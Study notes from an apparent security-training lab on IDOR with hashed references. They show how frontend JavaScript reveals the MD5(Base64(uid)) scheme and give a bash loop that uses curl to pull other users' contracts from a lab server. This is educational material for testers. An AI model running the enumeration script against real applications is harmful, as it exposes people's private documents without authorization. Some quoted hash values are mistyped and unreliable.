![Image](https://images.openai.com/static-rsc-4/CF6cm7wTgLMOGZQ62nwEvMXzCSAToI2T5Jz2tckk7L3XasepR88-pdYLC9bTOkiA9Zx_0K2Z7eoJ9qRwNIWHwlHkpa0PbWaBZoJt9xpJNKDEPX5IObtSCKqxxxmLLe1DF6T9PdGMhKYA8jz8yIEUy2ZHujocw4zS3UPKRL9UzCbtDZDTQcHUq3cfEnb86cRn?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/-cdxhwYt_aJ1ITGjCNkgfOOnQ4oNMApOkWNXFKx4Cv-OpcUv7ac8VZeLsMuBsxmEyFx7r-z6B_PiLsn4hajtRGtn2c59L8WHwf360yBScThvi7ThfQ9wcvGGw0mhGDFlXuU1OXdVM5ASk7F3m9U9URBWP8uKTb-if0pSmfL0m9Kj9c2JBjIDUjKzoLBDU7JN?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/bUJzc0dc881tmjqcH2KbhNBrWHFXm8Dn3emKdYJZVCmz-xLY_RFfJ4Sz2x1Uqv-KOuRwb83L8oRsWNnuDkDsr7-PQ3_jv2YQGop1wIvt-xdVyW_BL2in50IQ3LX0JCzqYQ6goN_EWXXF-u6ezE7Keur8UBrb3HaIS6q0c8MwStdwAZK1VMx6LaJ2yjeDseVd?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/lm0Sb02tdOyOLtv9LlcPg3IdVNJot3zDRsrmn4cpyI6m-z_UkOGfJpu8cL0hLwQ8Btd005ogVzrAZEBNevC2brhlm1SNyj1aKy2KDellWEkoyokWJaDYBLsVMrBmhJG-29VcEBPqXVt6Da7ucwLzNUnXvb_lNg79Jan2dEH7hkt4Y8LyhvmJjU1bxJMFq_iD?purpose=fullsize)

## 1. Core Concept

In the previous IDOR example, the object reference was obvious:

```text
/documents.php?uid=1
```

This makes enumeration easy because we can simply try:

```text
uid=1
uid=2
uid=3
...
```

However, applications sometimes try to hide object references by **encoding or hashing** them.

Example:

```text
download.php?contract=cdd96d3cc73d1dbdaffa03c6cd7339b
```

At first glance, this looks much harder to manipulate.

### Important point

> **Encoding or hashing an object reference does NOT automatically provide access control.**

If the backend still fails to verify whether the authenticated user is authorized to access the referenced object, the application can remain vulnerable to IDOR.

---

# 2. The Employee Manager Example

The application has an employee **Contracts** section.

When we click:

```text
Employment_contract.pdf
```

the browser sends a request similar to:

```http
POST /download.php
```

with:

```text
contract=cdd96d3cc73d1dbdaffa03c6cd7339b
```

Instead of directly exposing something like:

```text
contract=1
```

the application appears to use an MD5 hash.

---

# 3. Why MD5 Makes Things Look Secure

MD5 produces a fixed-length hexadecimal value.

For example:

```text
1
```

hashed with MD5 becomes:

```text
c4ca4238a0b923820dcc509a6f75849b
```

The important property here is that MD5 is a **hash**, not an encryption scheme.

### Encryption

```text
plaintext → encryption → ciphertext
                         ↓
                    decryption
                         ↓
                      plaintext
```

### Hashing

```text
plaintext → hash → digest
```

There isn't a normal "decrypt MD5" operation that gives you the original input.

Therefore, if we only have:

```text
cdd96d3cc73d1dbdaffa03c6cd7339b
```

we cannot simply decode it.

---

# 4. First Attempt — Hash the UID

A logical first test is:

> "Maybe the application simply hashes the employee UID."

For example:

```bash
echo -n 1 | md5sum
```

Output:

```text
c4ca4238a0b923820dcc509a6f75849b -
```

But the application expects:

```text
cdd96d3cc73d1dbdaffa03c6cd7339b
```

They don't match.

Therefore:

```text
MD5(uid)
      ↓
      ❌
```

isn't the algorithm used by this application.

---

# 5. Other Possible Inputs

A tester might investigate whether the hash is generated from something such as:

```text
uid
username
filename
employee ID
contract name
combination of values
```

The general idea is:

```text
Potential input
      ↓
Hash it
      ↓
Compare with observed hash
      ↓
Match?
```

If nothing matches, the reference may initially appear difficult to reproduce.

---

# 6. Secure Direct Object Reference?

If the reference were generated from an unpredictable secret value and the backend properly enforced authorization, it could be significantly harder to enumerate.

But there is an important distinction:

### Obscurity

```text
Hide the ID
```

### Authorization

```text
Verify the user can access the ID
```

**Hiding an identifier isn't a replacement for authorization.**

---

# 7. 🚨 Function Disclosure

The critical weakness in this exercise isn't immediately visible in the HTTP request.

It's in the **frontend JavaScript**.

Modern applications frequently contain JavaScript code that performs operations such as:

```text
Download file
Change password
Delete account
Update profile
Call API
```

If sensitive object-reference generation happens in client-side JavaScript, a tester can inspect the code and potentially understand exactly how the reference is generated.

---

# 8. Finding the JavaScript Function

The contract link contains:

```javascript
javascript:downloadContract('1')
```

This tells us something extremely important.

The function receives:

```text
uid = 1
```

Now we can inspect the implementation of:

```javascript
downloadContract()
```

The application contains:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

This reveals the entire transformation.

---

# 9. Understanding the Function

The important expression is:

```javascript
CryptoJS.MD5(btoa(uid)).toString()
```

Work from the inside outward:

```text
uid
 ↓
btoa(uid)
 ↓
Base64 encoding
 ↓
CryptoJS.MD5(...)
 ↓
MD5 hash
 ↓
.toString()
 ↓
Final contract reference
```

So the algorithm is:

```text
UID
 ↓
Base64
 ↓
MD5
 ↓
contract parameter
```

---

# 10. What Does `btoa()` Do?

In JavaScript:

```javascript
btoa()
```

performs Base64 encoding.

For example:

```text
1
```

becomes:

```text
MQ==
```

So the application isn't doing:

```text
MD5("1")
```

It is doing:

```text
MD5(Base64("1"))
```

This difference is critical.

---

# 11. Reproducing the Hash

We can reproduce the exact process from the Linux command line:

```bash
echo -n 1 | base64 -w 0 | md5sum
```

Result:

```text
cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

This matches the value observed in the HTTP request:

```text
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

🎯 **The transformation has been successfully identified.**

---

# 12. Why `echo -n` Matters

Normally:

```bash
echo 1
```

adds a newline:

```text
1\n
```

But:

```bash
echo -n 1
```

produces:

```text
1
```

without the newline.

This matters because:

```text
MD5("1")
```

and:

```text
MD5("1\n")
```

produce completely different hashes.

---

# 13. Why `base64 -w 0` Matters

The module uses:

```bash
base64 -w 0
```

The `-w 0` option prevents Base64 from inserting line wrapping/newlines into the output.

Therefore:

```text
echo -n 1
      ↓
base64 -w 0
      ↓
MQ==
      ↓
MD5
      ↓
cdd96d3cc73d1dbdaffa03cc6cd7339b
```

---

# 14. The "Reverse" Isn't Actually Reversing MD5

This is a very important conceptual distinction.

We aren't mathematically reversing MD5.

Instead, we discovered the **input transformation**:

```text
UID
 ↓
Base64
 ↓
MD5
```

Once we know the original input for our own object:

```text
uid=1
```

we can reproduce the process for other IDs.

For example:

```text
uid=2
 ↓
Base64
 ↓
MD5
 ↓
hash for user 2
```

Then:

```text
uid=3
 ↓
Base64
 ↓
MD5
 ↓
hash for user 3
```

And so on.

---

# 15. Mass Enumeration

The module demonstrates generating hashes for the first ten users:

```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

This produces:

```text
cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

---

# 16. Understanding `tr -d ' -'`

The normal `md5sum` output looks like:

```text
HASH  -
```

For example:

```text
cdd96d3cc73d1dbdaffa03cc6cd7339b  -
```

The command:

```bash
tr -d ' -'
```

removes:

```text
space
-
```

leaving only:

```text
cdd96d3cc73d1dbdaffa03cc6cd7339b
```

This makes the hash easier to use as a variable in automation.

---

# 17. Automated Contract Retrieval

The module's final lab script is:

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

### Logic

```text
UID 1
 ↓
Base64
 ↓
MD5
 ↓
POST hash
 ↓
Download contract

UID 2
 ↓
Base64
 ↓
MD5
 ↓
POST hash
 ↓
Download contract

...
```

---

# 18. Understanding `curl -sOJ`

The command:

```bash
curl -sOJ
```

uses several options:

### `-s`

Silent mode.

Suppresses normal progress/output.

### `-O`

Writes the downloaded file using the filename supplied by the server.

### `-J`

Tells `curl` to use the server-provided `Content-Disposition` filename when available.

Together, these make automated file downloading convenient.

---

# 19. The Final Result

After executing the script, the exercise produces files such as:

```text
contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contract_5d4aace023dc088767b4e08c79415dcd.pdf
contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_d477819d240e7d3dd9499ed8d23e7158.pdf
contract_f7947d50da7a043693a592b4db43b0a1.pdf
```

This demonstrates that the encoded/hashed references can still be reproduced.

---

# 20. Complete Attack Chain

![Image](https://images.openai.com/static-rsc-4/CF6cm7wTgLMOGZQ62nwEvMXzCSAToI2T5Jz2tckk7L3XasepR88-pdYLC9bTOkiA9Zx_0K2Z7eoJ9qRwNIWHwlHkpa0PbWaBZoJt9xpJNKDEPX5IObtSCKqxxxmLLe1DF6T9PdGMhKYA8jz8yIEUy2ZHujocw4zS3UPKRL9UzCbtDZDTQcHUq3cfEnb86cRn?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/lm0Sb02tdOyOLtv9LlcPg3IdVNJot3zDRsrmn4cpyI6m-z_UkOGfJpu8cL0hLwQ8Btd005ogVzrAZEBNevC2brhlm1SNyj1aKy2KDellWEkoyokWJaDYBLsVMrBmhJG-29VcEBPqXVt6Da7ucwLzNUnXvb_lNg79Jan2dEH7hkt4Y8LyhvmJjU1bxJMFq_iD?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/rImC4DD1lpVx1TL-cAk74bVEYtXuhWSWjK58WnlwFa3B13a2F54NY9n7VZvYX-qs2ZrgkGVL43B3f_oh8bvdbZ6UzhQNouXXHEts0ZX50l1uxmRw9orr3VaSbFbLp5X16ko0HTXcQyV64IbOc9BsRHrzNWgwIbMyXeVIgwadJNxHP_2kXT9Ujodve6-iNx_R?purpose=fullsize)

The entire concept can be remembered as:

```text
Contract download
       ↓
Inspect HTTP request
       ↓
See hashed reference
       ↓
Try identifying hash input
       ↓
Inspect frontend JavaScript
       ↓
Find downloadContract(uid)
       ↓
Discover:
MD5(Base64(uid))
       ↓
Reproduce locally
       ↓
Generate references for other UIDs
       ↓
Send requests
       ↓
Retrieve other contracts
```

---

# 🧠 21. Key Concepts to Remember

### ⭐ Hashing ≠ Authorization

A hash can hide an object's identifier, but it does not determine whether the user is allowed to access that object.

---

### ⭐ Encoding ≠ Encryption

Base64 is encoding:

```text
Data → Base64 → Encoded data
```

It is **not encryption** and provides no confidentiality.

---

### ⭐ MD5 is not encryption

MD5 is a cryptographic hash function.

You don't normally "decrypt" it.

Instead, if the input space or generation algorithm is known, you can calculate candidate hashes and compare them.

---

### ⭐ Client-side JavaScript is visible

Anything sent to the browser should generally be considered inspectable by the user.

Therefore, don't rely on frontend JavaScript to keep:

- Secrets
    
- Authorization decisions
    
- Sensitive keys
    
- Access-control logic
    

hidden.

---

# 🔥 22. Most Important Exam/Interview Point

Suppose you see:

```text
contract=cdd96d3cc73d1dbdaffa03c6cd7339b
```

Don't immediately conclude:

> "It's hashed, so it can't be an IDOR."

Instead ask:

```text
1. What is being hashed?
2. How is it transformed?
3. Where is the transformation performed?
4. Can I reproduce it?
5. Does the backend verify authorization?
```

The crucial discovery in this exercise was:

```text
CryptoJS.MD5(btoa(uid))
```

which means:

```text
UID → Base64 → MD5 → Contract reference
```

Once that deterministic transformation is known, the reference can be generated for other UIDs.

---

# 📌 23. Quick Revision Sheet

|Concept|Meaning|
|---|---|
|**IDOR**|Unauthorized access to an object through a controllable reference|
|**Encoded reference**|Object reference transformed using encoding|
|**Hashed reference**|Object reference transformed using a hash|
|**Base64**|Encoding, not encryption|
|**MD5**|Hash function|
|**`btoa()`**|JavaScript Base64 encoder|
|**`CryptoJS.MD5()`**|JavaScript MD5 hashing|
|**Function disclosure**|Discovering sensitive logic in frontend code|
|**Mass enumeration**|Automating reference generation/testing|
|**Root vulnerability**|Missing/weak backend authorization|

## 🎯 Golden Takeaway

> **Never assume an IDOR is secure simply because the object reference is encoded or hashed.**

The correct mindset is:

**`Find the reference → inspect how it is generated → reproduce the transformation → test authorization → determine whether another user's object can be accessed.`**

And remember the exercise's key transformation:

```text
uid
 ↓
btoa(uid)
 ↓
Base64
 ↓
CryptoJS.MD5()
 ↓
contract parameter
```

If the backend doesn't independently verify that the authenticated user is authorized to access the resulting contract, **hashing the UID only obscures the reference—it doesn't fix the IDOR.**
